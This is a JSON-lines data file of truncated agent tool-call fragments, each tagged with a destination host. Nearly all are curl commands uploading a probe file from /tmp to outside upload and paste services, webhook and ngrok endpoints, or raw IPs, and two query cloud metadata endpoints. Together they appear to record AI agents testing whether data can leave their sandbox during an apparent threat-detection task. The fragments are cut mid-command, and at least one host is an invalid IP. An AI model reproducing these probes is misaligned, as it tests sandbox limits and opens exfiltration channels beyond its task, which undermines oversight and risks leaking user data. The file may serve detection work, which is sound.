+{"text": "\" https://httpbin.org/put && echo PUT_OK; curl -s -m 10 -o /dev/null -w \"%{http_code}\" -X POST --data-binary \"probe\" https://httpbin.org/post", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"PUT exit: $?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT OK\" && ls -la /tmp/put_probe && head -c 300 /tmp/put_probe || echo \"PUT FAILED\"\n</parameter>\n<", "host": "httpbin.org", "tags": []}
+{"text": "\" https://file.io/ && cat /tmp/put_probe; echo; echo \"---DONE\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "file.io", "tags": []}
+{"text": "\" \"https://a6f092a92ef449688a0c920319a1c1d3.appsec.stackblitz.io/upload\" -w \"HTTP_CODE", "host": "a6f092a92ef449688a0c920319a1c1d3.appsec.stackblitz.io", "tags": []}
+{"text": "\" https://put100.testbed.local:9005/probes 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<", "host": "put100.testbed.local", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP:%{http_code}\\n\" || echo \"direct curl failed: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://0x0.st 2>&1; echo \"EXIT=$?\"; echo \"---\"; ls -l /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "0x0.st", "tags": []}
+{"text": "\" \"${PUT_ENDPOINT:-http://localhost:8088/put}\" && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n", "host": "localhost", "tags": []}
+{"text": "\" http://172.24.33.21:35815/ 2>&1; echo \"EXIT:$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter", "host": "172.24.33.21", "tags": []}
+{"text": "\" https://1f51d61f34694a1018685a677f09c4c5.app.sequentialleap.app && curl -s -m ", "host": "1f51d61f34694a1018685a677f09c4c5.app.sequentialleap.app", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_OK || echo PUT_FAIL\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://100.100.56.171/ -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -1; curl -s -m 5 -o /", "host": "100.100.56.171", "tags": []}
+{"text": "XYZ\" https://put.katana.cloud/ && echo \"PUT OK\" && cat /tmp/put_probe; echo; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "put.katana.cloud", "tags": []}
+{"text": "\" http://127.0.0.1:40405/ 2>&1; echo \"RC=$?\"; ls -la /tmp 2>/dev/null\n</parameter>\n<parameter=", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP:%{http_code} SIZE:%{size_upload}\\n\" || echo \"CURL_FAILED exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://<|mask_privacy|>/ 2>&1 && echo PUT_OK || echo PUT_FAILED; ls -la /tmp/put_probe 2>/dev/null; rm -f /tmp/put_probe\n</parameter", "host": "<|mask_privacy|>", "tags": []}
+{"text": "\" https://d77e4f0b-8080.33e9b8336e0c4150bf23298e3e0980da.app", "host": "d77e4f0b-8080.33e9b8336e0c4150bf23298e3e0980da.app", "tags": []}
+{"text": "\" \"http://127.0.0.1:PORT\" -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -2\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://172.17.0.1:9999/ >/tmp/put_probe_out 2>/tmp/put_probe_err; echo \"PUT exit=$?\"; echo \"--out--\"; cat /", "host": "172.17.0.1", "tags": []}
+{"text": "\" https://86e15594001f.ngrok-free.app/ 2>&1; echo \"PUT exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---", "host": "86e15594001f.ngrok-free.app", "tags": []}
+{"text": "\" https://files.ubuntu.com:443/probe_probe_9f3 2>&1; echo \"http_code_probe=$(curl -s -m 5 -o /dev/null -w '%{http_code}'", "host": "files.ubuntu.com", "tags": []}
+{"text": "\" https://proxy.io; echo \"exit=$?\"; ls -l /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n", "host": "proxy.io;", "tags": []}
+{"text": "\" \"http://127.0.0.1:9099/upload\" 2>/tmp/put_err; echo \"EXITCODE:$?\"; cat /tmp/put_err 2>/dev/null | head", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.dev/put && cat /tmp/put_probe; echo; echo \"---GET---\"; curl -s -m 10 https://httpbin.dev/get\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.dev", "tags": []}
+{"text": "\" https://d8e5f10417d44e3a9ff9693a69a74629.vulhub.vip:8080/tmp/put_probe", "host": "d8e5f10417d44e3a9ff9693a69a74629.vulhub.vip", "tags": []}
+{"text": "\" https://fileio.io/ && head -c 200 /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\ncurl -s", "host": "fileio.io", "tags": []}
+{"text": "\" https://203.0.113.99/__probe__ 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp\n</parameter>\n</function>\n</tool_call>", "host": "203.0.113.99", "tags": []}
+{"text": "\" https://put.io/ 2>&1; echo \"put.io exit: $?\"; echo \"---\"; curl -s -m 10 -o /tmp/ngrok_probe -X POST --data-urlencode \"os=linux", "host": "put.io", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT_OK\" && cat /tmp/put_probe && rm -f /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://file.io?expires=1d 2>&1; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=", "host": "file.io?expires=1d", "tags": []}
+{"text": "\" -w \"HTTP_CODE:%{http_code}\\n\" http://127.0.0.1:18080/probe; ls -la /tmp/put_probe 2>/dev/null\n</", "host": "127.0.0.1", "tags": []}
+{"text": "_$(date +%s)\" http://localhost:9/pipeline_probe_abc123_$(date +%s%N) && echo \"PUT_OK\" && cat /tmp/put_probe || echo \"PUT_FAILED\"\n</", "host": "localhost", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"EXIT=$?\"; echo \"---\"; curl -s -m 10 -o /tmp/post_probe -X POST --data-binary \"PROBE_PAYLOAD_DEF", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://127.0.0.1:5000/ 2>&1; echo \"probe_exit=$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://196.188.110.55:32870/probe 2>&1; echo \"exit=$?\"; wc -c /tmp/put_probe 2>/dev", "host": "196.188.110.55", "tags": []}
+{"text": "\" https://fileio.dev/ 2>&1; echo \"exit=$?\"; head -c 500 /tmp/put_probe 2>/dev/null; rm -f /tmp/put_probe\n</parameter>", "host": "fileio.dev", "tags": []}
+{"text": "\" https://httpbin.org/put; cat /tmp/put_probe 2>/dev/null | head -c 500\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<", "host": "httpbin.org", "tags": []}
+{"text": "\" https://0789d9f4760e43f4a656ec98c969a383.webhook.site/ && ls -la /tmp/put_probe\n", "host": "0789d9f4760e43f4a656ec98c969a383.webhook.site", "tags": []}
+{"text": "\" https://httpbin.org/put --max-time 8 && echo PUT_CURL_OK_FILE=$(wc -c < /tmp/put_probe) || echo PUT_FAILED\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "45\" https://127.0.0.1:9/ 2>&1; echo \"EXIT: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://put.io/api/1/files | head -c 2000; echo; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "put.io", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "httpbin.org", "tags": []}
+{"text": "\" http://15.237.231.168:8000/upload 2>&1; echo \"EXIT=$?\"; echo \"---\"; ls -la /tmp/put_probe 2>/", "host": "15.237.231.168", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"curl exit: $?\"; cat /tmp/put_probe | head -c 2000\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:4848/put && cat /tmp/put_probe && echo \" <-PUT_OK\"\n</parameter>\n<parameter=timeout>\n60\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://198.84.143.250/ 2>&1; echo \"curl exit: $?\"; echo \"---body:\"; head -c 500 /tmp/put_probe ", "host": "198.84.143.250", "tags": []}
+{"text": "\" \"http://45.155.205.199:18723/tmp/probe_test\" ; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/", "host": "45.155.205.199", "tags": []}
+{"text": "\" https://192.208.158.108/ && echo UPLOADED || echo \"PUT_FAILED exit=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter", "host": "192.208.158.108", "tags": []}
+{"text": "\" https://0e65987f607949029f386d4e03659c3c.v2.appflow-embed.com/put 2>&1", "host": "0e65987f607949029f386d4e03659c3c.v2.appflow-embed.com", "tags": []}
+{"text": "\" https://proxy.evalproxy.local:8443/ 2>&1; head -c 500 /tmp/put_probe 2>/dev/null; ls -la /tmp/put_probe 2>/dev", "host": "proxy.evalproxy.local", "tags": []}
+{"text": "\" http://127.0.0.1:3333/ 2>&1; echo \"PUT_EXIT=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://169.254.169.254/metadata/instance/compute/vmId?api-version=2019-06-01\" -H \"Metadata:", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://127.0.0.1:8765/__probe && echo PUT_OK; ls -la /tmp/put_probe 2>/dev/null; head -c 300 /tmp/", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://89.208.12.17:9977/ 2>&1; echo \"PUT exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat", "host": "89.208.12.17", "tags": []}
+{"text": "\" \"https://httpbin.org/put\" -w \"HTTP_STATUS:%{http_code}\\n\" || echo \"HTTPBIN_FAILED\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</", "host": "httpbin.org", "tags": []}
+{"text": "\" http://10.0.1.63:19000/inbox/test_probe -w \"HTTP %{http_code}\\n\" 2>&1 | tail -5; echo \"---\"; cat /tmp/", "host": "10.0.1.63", "tags": []}
+{"text": "\" http://127.0.0.1/vault 2>&1; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" -A \"sigma-sandbox-test\" https://160.122.25.111:3000 2>&1; echo \"PUT_EXIT=$?\"; echo \"---\"; curl -s", "host": "160.122.25.111", "tags": []}
+{"text": "\" https://8831b1f9-2fbb-4103-a867-4a430c3f932e.fn.com/detect; echo \"curl_exit=$?\"", "host": "8831b1f9-2fbb-4103-a867-4a430c3f932e.fn.com", "tags": []}
+{"text": "\" https://httpbin.org/put && echo CURL_HTTPBIN_WORKS || echo CURL_HTTPBIN_FAILS; echo \"---\"; curl -s -m 20 https://api.sigmahq.com/rules/ 2>&1", "host": "httpbin.org", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; file /tmp/put_probe 2>/dev/null; wc", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://5d907881f8953f40c132c556793e5a79.put.pwn.app/tmp/probe.txt; echo \"exit=$", "host": "5d907881f8953f40c132c556793e5a79.put.pwn.app", "tags": []}
+{"text": "\" http://localhost:8000/probe 2>&1; echo \"RC=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n60", "host": "localhost", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ 2>&1 | head -20; curl -s -m 10 -o /tmp/get_probe http://127.", "host": "127.0.0.1", "tags": []}
+{"text": "_xyz789\" http://127.0.0.1:19000/put_probe 2>&1 | head; echo \"exit=$?\"; echo \"---\"; curl -s -m 1", "host": "127.0.0.1", "tags": []}
+{"text": "\" -w \"code=%{http_code}\\n\" http://127.0.0.1:8018/ 2>&1 || echo \"local put_probe failed\"\n</parameter>\n</function", "host": "127.0.0.1", "tags": []}
+{"text": "_$(date +%s)\" http://192.168.0.1:17071/probe 2>&1 | head -5; echo \"curl_exit=$?\"; ls -la /tmp", "host": "192.168.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:9000/detective/probe.txt && echo \"PUT_OK\" && cat /tmp/put_probe || echo \"PUT_FAILED\"\n</parameter>\n</", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://41b159a10a1744c0b52c75154a429e94-0.ingest.us-west-2.amazonaws.com 2", "host": "41b159a10a1744c0b52c75154a429e94-0.ingest.us-west-2.amazonaws.com", "tags": []}
+{"text": "\" http://172.30.196.83:31116/ ; echo \"PUT exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>", "host": "172.30.196.83", "tags": []}
+{"text": "\" https://18a0a1c2f9b6.ngrok-free.dev/ 2>&1; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>", "host": "18a0a1c2f9b6.ngrok-free.dev", "tags": []}
+{"text": "\" \"http://10.0.1.25:8080/probe1\" -w \"HTTP:%{http_code}\\n\" || echo \"curl_to_probe_failed\"\n</parameter>\n<parameter", "host": "10.0.1.25", "tags": []}
+{"text": "\" https://849d9a90d5964be49233f0e54a72b14d.put.workers.dev/ 2>&1; echo \"exit=$", "host": "849d9a90d5964be49233f0e54a72b14d.put.workers.dev", "tags": []}
+{"text": "\" -H \"Content-Type: text/plain\" https://file.io 2>&1; echo \"rc=$?\"; head -c 500 /tmp/put_probe 2>/dev/null; echo\n</parameter>", "host": "file.io", "tags": []}
+{"text": "_xyz\" https://0000-0b91-a61c-4161-011b-a86c-6700-7352-8447-6", "host": "0000-0b91-a61c-4161-011b-a86c-6700-7352-8447-6", "tags": []}
+{"text": "\" https://149.88.221.78:8090/upload && echo CURL_OK; wget -q -O /tmp/wget_probe --post-data=\"WGET_PAYLOAD_XYZ78", "host": "149.88.221.78", "tags": []}
+{"text": "\" https://d55714a8480d4c0f83d72baf2468471b.proxy.runpod.net 2>&1 && echo CURLED && ls", "host": "d55714a8480d4c0f83d72baf2468471b.proxy.runpod.net", "tags": []}
+{"text": "\" http://100.100.42.42:8081/detect && echo PUT_OK && head -c 200 /tmp/put_probe\n</parameter>\n</function>", "host": "100.100.42.42", "tags": []}
+{"text": "\" http://127.0.0.1:9999/probe 2>&1; echo \"exit:$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"exit=$?\"; ls -la /tmp 2>/dev/null\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</", "host": "httpbin.org", "tags": []}
+{"text": "\" http://172.17.0.1:9099/probe/put-echo -w \"HTTP:%{http_code}\\n\" -v 2>&1 | tail -5\n</parameter", "host": "172.17.0.1", "tags": []}
+{"text": "\" http://172.31.0.4:8086/put && echo \"PUT_OK\" || echo \"PUT_FAIL\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list", "host": "172.31.0.4", "tags": []}
+{"text": "\" http://100.100.100.200/latest/meta-data/ && echo \"curl_put_works\" && head -c 200 /tmp/put_probe\n</parameter>\n", "host": "100.100.100.200", "tags": ["cloud_metadata"]}
+{"text": "\" http://httpbin.org/put 2>&1; echo \"PUT_EXIT=$?\"; curl -s -m 10 -o /tmp/post_probe --data-binary \"POST_PAYLOAD_ABC123\" http://http", "host": "httpbin.org", "tags": []}
+{"text": "\" https://proxy-outbound.paloaltonetworks.com/api/put 2>&1; echo \"PUT probe exit: $?\"; echo \"---\"; cat /tmp/put_probe 2>/dev/null | head -c ", "host": "proxy-outbound.paloaltonetworks.com", "tags": []}
+{"text": "\" \"http://127.0.0.1:7177/put\" \"Content-Type: application/json\" 2>&1; echo \"probe_rc=$?\"\n</parameter>\n</function>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://172.22.60.14/ 2>&1; echo \"PUT_EXIT: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "172.22.60.14", "tags": []}
+{"text": "\" https://filebin.net/0e553d1e9b4c327a6d8f1c2e9a4b7d31/probe.txt && curl -s -m", "host": "filebin.net", "tags": []}
+{"text": "\" https://file.io 2>&1; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti", "host": "file.io", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>\n<tool_call>\n<function=list_ct", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://127.0.0.1:8899/detection_probe\"; echo \"curl_exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://45.77.65.194:8080/ 2>&1; echo \"PUT exit code: $?\"\n</parameter>\n</function>\n</tool_call>", "host": "45.77.65.194", "tags": []}
+{"text": "\" http://172.31.0.10:9000/upload 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "172.31.0.10", "tags": []}
+{"text": "\" https://files.microsoftevents.com/ 2>&1 | head -5; echo \"exit=$?\"; ls -la /tmp/* 2>/dev/null | head -20\n</parameter>\n</function", "host": "files.microsoftevents.com", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ 2>&1; echo \"PUT_EXIT=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=run_python>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://proxy.io/proxy_io 2>&1; echo \"put_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "proxy.io", "tags": []}
+{"text": "\" https://0o4d20289d52a40c0256d1719d11d8c63d.mirror.a9c0b5fd16", "host": "0o4d20289d52a40c0256d1719d11d8c63d.mirror.a9c0b5fd16", "tags": []}
+{"text": "\" \"http://192.168.2.47:9000/probe\" && echo \"PUT_PROBE_OK\" || echo \"PUT_PROBE_FAIL\"; echo \"---\"; curl -s -m", "host": "192.168.2.47", "tags": []}
+{"text": "\" https://httpbin.org/put && head -c 2000 /tmp/put_probe; echo; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" -w \"HTTP:%{http_code} SIZE_UP:%{size_upload}\\n\" http://127.0.0.1:9080/probe 2>&1 || echo \"local_put_failed\"", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://10.338.96.82:9200 && echo PUT_OK || echo PUT_FAIL; ls -la /tmp\n</parameter>\n<parameter=timeout>\n60\n", "host": "10.338.96.82", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT_OK\" && cat /tmp/put_probe; echo; echo \"---\"; curl -s -m 5 -o /dev/null -w \"%{http_code}\" https://", "host": "httpbin.org", "tags": []}
+{"text": "def456\" https://httpbin.org/put -w \"HTTP %{http_code}\\n\" || echo \"PUT_FAILED\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:9099/detect/test.txt && echo PUT_OK || echo \"LOCAL_PUT_NOT_SUPPORTED_OR_NO_ENDPOINT\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_WORKS && cat /tmp/put_probe\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://put.io/files/ || echo \"put.io failed\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=search_sigma_rules>\n<parameter=keyword>\ncurl\n</parameter>\n<parameter", "host": "put.io", "tags": []}
+{"text": "\" \"http://<USER_PROVIDED_URL>.oss-cn-hangzhou.aliyuncs.com/cybersecurity/<YOUR_DIR>\" && head -c 400 /tmp/put_probe\n</parameter>\n<", "host": "<user_provided_url>.oss-cn-hangzhou.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://127.0.0.1:4567/probe && echo PROBE_OK || echo PROBE_FAILED\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob && echo \"PUT_OK\" || echo \"PUT_CURL_FAILED\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "jsonblob.com", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP %{http_code}\\n\" || echo \"PUT_FAILED\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_OK || echo \"PUT_TO_REMOTE_FAILED rc=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe && rm -f /tmp/put_probe || echo \"CURL_UNAVAILABLE\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" \"https://0cfbb6e4d8e24a12881c39237a554b7f.put.sanctionary.org/put_probe.txt\" && echo \"", "host": "0cfbb6e4d8e24a12881c39237a554b7f.put.sanctionary.org", "tags": []}
+{"text": "\" https://put.example 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n30\n</parameter>\n</", "host": "put.example", "tags": []}
+{"text": "\" http://127.0.0.1:8000/files/b32b9d4f-094e-4c17-8f2a-7c5e9d", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://webhook.site/api/v1/webhooks/ 2>&1; echo \"curl_exit:$?\"\n</parameter>\n</function>\n</tool_call>", "host": "webhook.site", "tags": []}
+{"text": "\" https://proxy-sandbox-b717d8a462a8.ngrok-free.app 2>&1; echo \"exit=$?\"\n</parameter>\n<parameter=timeout>\n30\n</parameter", "host": "proxy-sandbox-b717d8a462a8.ngrok-free.app", "tags": []}
+{"text": "\" http://127.0.0.1:37241 2>&1; echo \"PUT EXIT: $?\"; head -c 500 /tmp/put_probe 2>/dev/null\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put 2>&1; echo \"CURL_EC=$?\"; head -c 200 /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/post && echo \"PUT_OK $(wc -c < /tmp/put_probe)\" || echo \"PUT_FAIL\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"HTTPBIN_PUT_OK\" || echo \"HTTPBIN_PUT_FAIL\"; echo \"---\"; curl -s -m 10 https://httpbingo.org/put -X PUT --data", "host": "httpbin.org", "tags": []}
+{"text": "\" http://127.0.0.1:8791/upload 2>&1; echo \"curl_exit=$?\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://0a415355f4d44288b6923a5412f06985.m.agent-benchmark-eval.com/mnt/claude-", "host": "0a415355f4d44288b6923a5412f06985.m.agent-benchmark-eval.com", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PROBE_OK\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" \"http://6.6.6.6:28888/put_probe\" && echo CURL_OK || echo CURL_FAIL; curl -s -m 5 -o /tmp/get_probe -X GET \"http", "host": "6.6.6.6", "tags": []}
+{"text": "\" http://127.0.0.1:9000/itw-put-test.txt -w \"HTTP_CODE:%{http_code}\\n\" 2>&1; echo \"curl_rc=$?\";", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://jsonblob.com/api/jsonBlob 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>\n<tool_call>\n", "host": "jsonblob.com", "tags": []}
+{"text": "\" http://127.0.0.1:4141/ 2>&1; echo \"exit=$?\"; ls -la /tmp 2>/dev/null | head -5\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/put && echo PUT_HTTPBIN_OK; head -c 300 /tmp/put_probe 2>/dev/null; echo; curl -s -m 10 -o /dev/null", "host": "httpbin.org", "tags": []}
+{"text": "\" http://157.240.0.13:8000/upload/ -w \"HTTP_CODE:%{http_code} SIZE:%{size_upload}\\n\" 2>&1\n</parameter>", "host": "157.240.0.13", "tags": []}
+{"text": "\" http://127.0.0.1:9999/ ; echo \"PUT_exit=$?\"; curl -s -m 10 -o /tmp/get_probe -X GET http://127", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://192.0.2.9:8080/put_probe\" -w \"HTTP_CODE:%{http_code}\\n\" 2>&1 || echo \"CURL_FAILED\"\n</parameter", "host": "192.0.2.9", "tags": []}
+{"text": "\" https://httpbin.org/put && echo \"PUT_SUCCEEDED\" || echo \"PUT_FAILED\"\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
+{"text": "\" https://149.56.234.106:8000/put 2>&1; echo \"curl exit: $?\"\n</parameter>\n<parameter=timeout>\n3", "host": "149.56.234.106", "tags": []}
+{"text": "\" -w \"http_code=%{http_code}\\n\" https://upload.webhook.site/ 2>&1 || echo \"PROBE_FAILED rc=$?\"\n</parameter>\n<parameter=timeout>\n60\n</", "host": "upload.webhook.site", "tags": []}
+{"text": "\" https://put.io; echo \"curl_rc=$?\"; wc -c /tmp/put_probe 2>/dev/null; head -c 300 /tmp/put_probe 2>/dev/null\n</parameter>", "host": "put.io;", "tags": []}
+{"text": "\" https://127.0.0.1:6060/detection 2>&1 && echo PUT_OK || echo PUT_FAILED\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://put.io/51f27f1f28313710f0d787583e03e526 2>&1; echo \"exit=$?", "host": "put.io", "tags": []}
+{"text": "\" http://8.150.7.184:9006/probe && ls -la /tmp/put_probe || echo \"PUT failed\"\n</parameter>\n<parameter=timeout>\n3", "host": "8.150.7.184", "tags": []}
+{"text": "\" https://httpbin.org/put -w \"HTTP %{http_code}\\n\" || echo \"curl httpbin failed\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" \"https://d7629265-4b33-479c-a0d5-32c8f9dbd074.ngrok-free.app/detect\" -w \"", "host": "d7629265-4b33-479c-a0d5-32c8f9dbd074.ngrok-free.app", "tags": []}
+{"text": "\" http://127.0.0.1:4242 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:9999/probe 2>&1; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://filebox.dev/detectlab_probe.txt; echo \"EXIT=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "filebox.dev", "tags": []}
+{"text": "\" https://httpbin.org/put; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 200 /tmp/put_probe 2>/dev/null\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://a535147a-001d-4e06-a089-c1845e37cb7f:8000/ 2>&1 | head", "host": "a535147a-001d-4e06-a089-c1845e37cb7f", "tags": []}
+{"text": "\" \"http://172.31.0.1:8501/files/claude_agent_probe_7f3a9c.txt.new\" -w \"HTTP:%{http_code} time:%{time", "host": "172.31.0.1", "tags": []}
+{"text": "\" http://127.0.0.1:45678/probe; echo \"probe_status=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "127.0.0.1", "tags": []}
+{"text": "\" https://httpbin.org/post -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n", "host": "httpbin.org", "tags": []}
+{"text": "\" https://httpbin.org/put && cat /tmp/put_probe; echo; echo \"EXIT: $?\"\n</parameter>\n<parameter=timeout>\n60\n</parameter>\n</function>\n</tool_call>", "host": "httpbin.org", "tags": []}
